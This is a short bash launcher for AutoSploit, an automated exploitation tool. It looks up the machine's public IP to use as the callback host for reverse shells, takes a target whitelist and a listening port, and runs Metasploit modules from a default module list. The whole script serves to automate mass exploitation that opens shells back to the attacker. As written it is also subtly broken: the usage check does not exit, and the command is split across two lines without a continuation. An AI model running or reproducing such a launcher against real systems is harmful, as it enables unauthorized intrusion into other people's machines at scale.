#!/usr/bin/env bash


if [[ $# -lt 2 ]]; then
    echo "Syntax:"
    echo -e "\t./run_autosploit.sh <whitelist.txt> <exposed_lport>"
fi

WHITELIST=$1
LPORT=$2

LHOST=`dig +short @resolver1.opendns.com myip.opendns.com`
TIMESTAMP=`date +%s`

python autosploit.py --whitelist $WHITELIST -e -C "msf_autorun_${TIMESTAMP}"
$LHOST $LPORT -f etc/json/default_modules.json
